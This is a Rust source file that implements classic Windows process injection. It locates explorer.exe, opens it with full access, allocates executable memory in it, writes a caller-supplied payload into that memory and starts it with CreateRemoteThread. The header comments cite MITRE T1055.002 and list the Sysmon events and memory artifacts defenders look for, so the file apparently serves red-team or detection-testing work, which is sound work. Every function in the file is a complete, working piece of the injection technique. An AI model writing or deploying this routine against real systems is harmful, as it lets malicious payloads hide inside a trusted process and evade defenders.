//! Windows Process Injection
//!
//! Classic CreateRemoteThread injection (MITRE T1055.002):
//! 1. Find target process (explorer.exe)
//! 2. OpenProcess with PROCESS_ALL_ACCESS
//! 3. VirtualAllocEx for RWX memory in target
//! 4. WriteProcessMemory to copy payload
//! 5. CreateRemoteThread to execute
//!
//! Detection artifacts:
//! - Sysmon EID 8: CreateRemoteThread (SourceImage != TargetImage)
//! - Sysmon EID 10: Process Access (PROCESS_ALL_ACCESS to explorer.exe)
//! - Memory: Unbacked RWX region in explorer.exe

#![cfg(windows)]

use super::InjectionError;
use std::ffi::c_void;
use std::ptr;
use windows::Win32::Foundation::*;
use windows::Win32::System::Diagnostics::ToolHelp::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;

/// Default injection target
const TARGET_PROCESS: &str = "explorer.exe";

/// Inject payload into target process.
pub fn inject(payload: &[u8]) -> Result<(), InjectionError> {
    // Find target process
    let pid = find_process(TARGET_PROCESS)?;

    // Open target process
    let process = open_process(pid)?;

    // Allocate memory in target
    let remote_mem = alloc_remote(process, payload.len())?;

    // Write payload to target
    write_remote(process, remote_mem, payload)?;

    // Create remote thread to execute
    create_remote_thread(process, remote_mem)?;

    // Cleanup handle
    unsafe { CloseHandle(process) };

    Ok(())
}

/// Find process ID by name.
fn find_process(name: &str) -> Result<u32, InjectionError> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| InjectionError::ProcessNotFound)?;

        if snapshot == INVALID_HANDLE_VALUE {
            return Err(InjectionError::ProcessNotFound);
        }

        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        let name_lower = name.to_lowercase();
        let mut result = None;

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                // Convert wide string to Rust string
                let exe_name: String = entry.szExeFile
                    .iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| c as u8 as char)
                    .collect();

                if exe_name.to_lowercase() == name_lower {
                    result = Some(entry.th32ProcessID);
                    break;
                }

                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        CloseHandle(snapshot);

        result.ok_or(InjectionError::ProcessNotFound)
    }
}

/// Open target process with required access.
fn open_process(pid: u32) -> Result<HANDLE, InjectionError> {
    unsafe {
        let handle = OpenProcess(
            PROCESS_ALL_ACCESS,
            false,
            pid,
        ).map_err(|e| InjectionError::OpenFailed(e.to_string()))?;

        if handle.is_invalid() {
            return Err(InjectionError::OpenFailed("Invalid handle".into()));
        }

        Ok(handle)
    }
}

/// Allocate RWX memory in target process.
fn alloc_remote(process: HANDLE, size: usize) -> Result<*mut c_void, InjectionError> {
    unsafe {
        let mem = VirtualAllocEx(
            process,
            Some(ptr::null()),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            return Err(InjectionError::AllocFailed(
                format!("VirtualAllocEx failed: {:?}", GetLastError())
            ));
        }

        Ok(mem)
    }
}

/// Write payload to allocated memory in target.
fn write_remote(process: HANDLE, addr: *mut c_void, data: &[u8]) -> Result<(), InjectionError> {
    unsafe {
        let mut written: usize = 0;

        WriteProcessMemory(
            process,
            addr,
            data.as_ptr() as *const c_void,
            data.len(),
            Some(&mut written),
        ).map_err(|e| InjectionError::WriteFailed(e.to_string()))?;

        if written != data.len() {
            return Err(InjectionError::WriteFailed(
                format!("Incomplete write: {} of {}", written, data.len())
            ));
        }

        Ok(())
    }
}

/// Create remote thread to execute payload.
fn create_remote_thread(process: HANDLE, addr: *mut c_void) -> Result<(), InjectionError> {
    unsafe {
        let thread = CreateRemoteThread(
            process,
            Some(ptr::null()),
            0,
            Some(std::mem::transmute(addr)),
            Some(ptr::null()),
            0,
            Some(ptr::null_mut()),
        ).map_err(|e| InjectionError::ThreadFailed(e.to_string()))?;

        if thread.is_invalid() {
            return Err(InjectionError::ThreadFailed("Invalid thread handle".into()));
        }

        // Wait briefly for thread to start
        let _ = WaitForSingleObject(thread, 1000);

        CloseHandle(thread);
        Ok(())
    }
}
